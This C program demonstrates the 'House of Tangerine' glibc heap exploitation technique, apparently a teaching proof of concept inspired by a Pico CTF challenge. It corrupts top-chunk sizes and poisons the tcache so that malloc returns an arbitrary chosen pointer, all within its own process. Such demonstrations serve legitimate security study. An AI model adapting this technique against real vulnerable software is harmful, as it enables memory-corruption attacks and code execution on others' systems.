#define _GNU_SOURCE
#include <stdio.h>
#include <string.h>
#include <assert.h>
#include <malloc.h>
#include <unistd.h>

#define MAX(x,y) (x < y ? y : x)

#define SIZE_SZ sizeof(size_t)

#define CHUNK_HDR_SZ (SIZE_SZ*2)
// same for x86_64 and x86
#define MALLOC_ALIGN 0x10L
#define MALLOC_MASK (-MALLOC_ALIGN)

#define PAGESIZE sysconf(_SC_PAGESIZE)
#define PAGE_MASK (PAGESIZE-1)

// fencepost are offsets removed from the top before freeing
#define FENCEPOST (2*CHUNK_HDR_SZ)

// size used for poisoned tcache
#define CHUNK_SIZE_1 0x40
#define SIZE_1 (CHUNK_SIZE_1-CHUNK_HDR_SZ)

// could also be split into multiple lower size allocations
#define CHUNK_SIZE_2 (PAGESIZE-(2*MALLOC_ALIGN)-CHUNK_SIZE_1)
#define SIZE_2 (CHUNK_SIZE_2-CHUNK_HDR_SZ)

// size used for poisoning tcache
#define CHUNK_SIZE_3 (0x20)
#define SIZE_3 (CHUNK_SIZE_3-CHUNK_HDR_SZ)

/**
 * Tested on GLIBC 2.31 (x86_64 & aarch64) and 2.27 (x86_64)
 *
 * House of Tangerine is the modernized version of House of Orange
 * and is able to corrupt heap without needing to call free() directly
 *
 * it uses the _int_free call to the top_chunk (wilderness) in sysmalloc
 * https://elixir.bootlin.com/glibc/glibc-2.39/source/malloc/malloc.c#L2913
 *
 * tcache-poisoning is used to trick malloc into returning a malloc aligned arbitrary pointer
 * by abusing the tcache freelist. (requires heap leak on and after 2.32)
 *
 * this version expects a positive OOB (e.g. BOF) vulnerability
 *
 * Special Thanks to pepsipu for creating the challenge "High Frequency Trading"
 * from Pico CTF 2024 that inspired this exploitation technique
 */
int main()
{
  size_t top_size, new_top_size, freed_top_size, vuln_tcache, target, *heap_ptr;
  char win[0x10] = "WIN\0WIN\0WIN\0\x06\xfe\x1b\xe2";
  // disable buffering
  setvbuf(stdout,NULL,_IONBF,0);
  setvbuf(stdin, NULL,_IONBF,0);
  setvbuf(stderr,NULL,_IONBF,0);

  // check if all chunks sizes are aligned
  assert((CHUNK_SIZE_1 & MALLOC_MASK) == CHUNK_SIZE_1);
  assert((CHUNK_SIZE_2 & MALLOC_MASK) == CHUNK_SIZE_2);
  assert((CHUNK_SIZE_3 & MALLOC_MASK) == CHUNK_SIZE_3);

  // size 1 and 3 target different bins, and therefore need to differ in size
  assert(CHUNK_SIZE_1 != CHUNK_SIZE_3);

  printf("chunk header = 0x%lx\n", CHUNK_HDR_SZ);
  printf("malloc align = 0x%lx\n", MALLOC_ALIGN);
  printf("page align = 0x%lx\n", PAGESIZE);
  printf("fencepost size = 0x%lx\n", FENCEPOST);
  printf("size_1 = 0x%lx\n", SIZE_1);
  printf("size_2 = 0x%lx\n", SIZE_2);
  printf("size_3 = 0x%lx\n", SIZE_3);


  printf("target tcache top size = 0x%lx\n", CHUNK_SIZE_1+FENCEPOST);

  // target is malloc chunk aligned 0x10 for x86_64
  target = ((size_t)win+(MALLOC_ALIGN-1)) & MALLOC_MASK;
  
  // first allocation 
  heap_ptr = malloc(SIZE_1); 

  // use BOF or OOB to corrupt to the top_chunk
  top_size = heap_ptr[(SIZE_1/SIZE_SZ)+1];
  printf("first top size = 0x%lx\n", top_size);

  // make sure corrupt top size is page aligned, generally 0x1000
  // https://elixir.bootlin.com/glibc/glibc-2.39/source/malloc/malloc.c#L2599
  new_top_size = top_size & PAGE_MASK;

  freed_top_size = (new_top_size-FENCEPOST) & MALLOC_MASK;

  assert(freed_top_size < CHUNK_SIZE_2);
  // freed_top_size must either create unsorted bin or CHUNK_SIZE_3 CACHE
  assert(freed_top_size >= 0x420 || freed_top_size == CHUNK_SIZE_3);
  assert(freed_top_size >= CHUNK_SIZE_3);

  heap_ptr[(SIZE_1/SIZE_SZ)+1] = new_top_size;
  printf("new first top size = 0x%lx\n", new_top_size);


  /*
   * malloc (larger than available_top_size), to free previous top_chunk using _int_free.
   * This happens inside sysmalloc, where the top_chunk gets freed if it can't be merged
   * we prevent the top_chunk from being merged by lowering its size
   * we can also circumvent some corruption checks by keeping the LSB unchanged
   */

  // create two tcache bins for SIZE_1, in order to use tcache-poisoning
  for (int i = 0; i < 2; ++i) {
    heap_ptr = malloc(SIZE_2);

    top_size = heap_ptr[(SIZE_2/SIZE_SZ)+1];
    printf("current top size = 0x%lx\n", top_size);

    // make sure corrupt top size is page aligned, generally 0x1000
    // https://elixir.bootlin.com/glibc/glibc-2.39/source/malloc/malloc.c#L2599
    new_top_size = top_size&PAGE_MASK;
    heap_ptr[(SIZE_2/SIZE_SZ)+1] = new_top_size;
    printf("new top size = 0x%lx\n", new_top_size);

    // remove fencepost from top_chunk, to get size that will be freed
    // https://elixir.bootlin.com/glibc/glibc-2.39/source/malloc/malloc.c#L2895
    freed_top_size = (new_top_size-FENCEPOST) & MALLOC_MASK;
    printf("freed top_chunk size = 0x%lx\n", freed_top_size);

    assert(freed_top_size == CHUNK_SIZE_1);
  }

  // this will be our vuln_tcache for tcache poisoning
  vuln_tcache = (size_t) &heap_ptr[(SIZE_2/SIZE_SZ)+2];

  printf("tcache next ptr: 0x%lx\n", vuln_tcache);

  // free the previous top_chunk
  heap_ptr = malloc(SIZE_2);

  // allocate into unsorted bin in order to start tcache poisoning
  heap_ptr = malloc(SIZE_3);
  assert((size_t)heap_ptr < (size_t)vuln_tcache);
  
  // corrupt next ptr into pointing to target
  heap_ptr[(vuln_tcache-(size_t)heap_ptr)/SIZE_SZ] = target;

  // allocate first tcache (corrupt next tcache bin)
  heap_ptr = malloc(SIZE_1);

  // get arbitary ptr for reads or writes 
  heap_ptr = malloc(SIZE_1);

  // proof that heap_ptr now points to the same string as target
  assert((size_t)heap_ptr == target);
  puts((char*) heap_ptr);
}
